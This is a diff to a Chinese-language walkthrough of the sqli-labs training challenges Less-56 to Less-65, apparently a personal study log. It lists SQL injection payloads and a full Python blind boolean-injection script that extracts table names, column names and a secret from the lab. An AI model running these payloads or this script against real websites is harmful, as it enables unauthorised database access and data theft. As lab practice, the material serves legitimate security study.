@@ -1256,7 +1256,7 @@ ERROR 1105 (HY000): XPATH syntax error: '~information_schema,c~'
 2. 其余方式同上
 
 ### Less-56
-
+length(database())=10
 在14次测试中获取到密钥
 
 1. 判断闭合方式,得到闭合方式为`')`,同时没有报错信息
@@ -1281,6 +1281,8 @@ ERROR 1105 (HY000): XPATH syntax error: '~information_schema,c~'
 
 3. 传入`?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,30) from information_schema.columns where table_name='DIJZ7NA09S'),0x7e),1)--%20`返回列名
 
+`select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database())`
+
 4. 传入`?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(secret_6WHE),1,30) from DIJZ7NA09S),0x7e),1)--%20`得到密钥
 
 ### Less-59
@@ -1288,5 +1290,128 @@ ERROR 1105 (HY000): XPATH syntax error: '~information_schema,c~'
 在5次测试中获取到密钥
 
 1. 判断闭合方式,得知不需要进行闭合,传入`1'`返回`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1`
+
+2. 其余同上
+
+### Less-60
+
+在5次测试中获取到密钥
+
+1. 判断闭合方式,传入`?id=1"`,返回`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1`,可知闭合方式为`")`
+
+2. 其余同上
+
+### Less-61
+
+在5次测试中获取到密钥
+
+1. 判断闭合方式,传入`?id=1'`,返回`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'')) LIMIT 0,1' at line 1`,可知闭合方式为`'))`
+
+2. 其余同上
+
+### Less-62
+
+在130次测试中获取到密钥
+
+1. 判断闭合方式,传入`?id=-1') or 1=1%23`,正常回显,闭合方式为`')`
+
+2. 获取`database`长度,`?id=-1') or length(database())=10%23`
+
+```python
+import requests
+import time
+
+url = 'http://127.0.0.1/Less-62/'
+
+
+def get_table_name():
+    table_name = ""
+    for i in range(1, 100):
+        low = 31
+        high = 128
+        mid = (low + high) // 2
+        while high > low:
+            payload = "?id=-1') or ascii(substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,%d,1))>%d-- " % (i, mid)
+            r = requests.get(url + payload)
+            if "Angelina" in r.text:
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+            time.sleep(0.1)
+        if mid == 31:
+            return table_name
+        table_name += chr(mid)
+
+
+def get_column_name(table_name):
+    column_name = ''
+    for i in range(11, 100):
+        low = 31
+        high = 128
+        mid = (low + high) // 2
+        while high > low:
+            payload = "?id=-1') or ascii(substr((select binary group_concat(column_name) from information_schema.columns where table_name='%s') ,%d,1))>%d-- " % (table_name, i, mid)
+            r = requests.get(url + payload)
+            if "Angelina" in r.text:
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+            time.sleep(0.1)
+        if mid == 31:
+            return column_name
+        column_name += chr(mid)
+
+
+def get_secret(table_name, column_name):
+    secret = ''
+    for i in range(1, 100):
+        low = 31
+        high = 128
+        mid = (low + high) // 2
+        while high > low:
+            payload = "?id=-1') or ascii(substr((select binary group_concat(%s) from %s) ,%d,1))>%d-- " % (column_name, table_name, i, mid)
+            r = requests.get(url + payload)
+            if "Angelina" in r.text:
+                low = mid + 1
+            else:
+                high = mid
+            mid = (low + high) // 2
+            time.sleep(0.1)
+        if mid == 31:
+            return secret
+        secret += chr(mid)
+
+
+table_name = get_table_name()
+print(table_name)
+column_name = get_column_name(table_name)
+print(column_name[:11])
+secret = get_secret(table_name, column_name[:11])
+print(secret)
+```
+
+### Less-63
+
+在130次测试中获取到密钥
+
+1. 判断闭合方式,传入`?id=-1' or 1=1%23`,正常回显,闭合方式为`'`
+
+2. 其余同上
+
+### Less-64
+
+在130次测试中获取到密钥
+
+1. 判断闭合方式,传入`?id=-1)) or 1%23`,正常回显,闭合方式为`))`
+
+2. 其余同上
+
+### Less-65
+
+在130次测试中获取到密钥
+
+1. 判断闭合方式,传入`?id=-1") or 1%23`,正常回显,闭合方式为`")`
 
 2. 其余同上
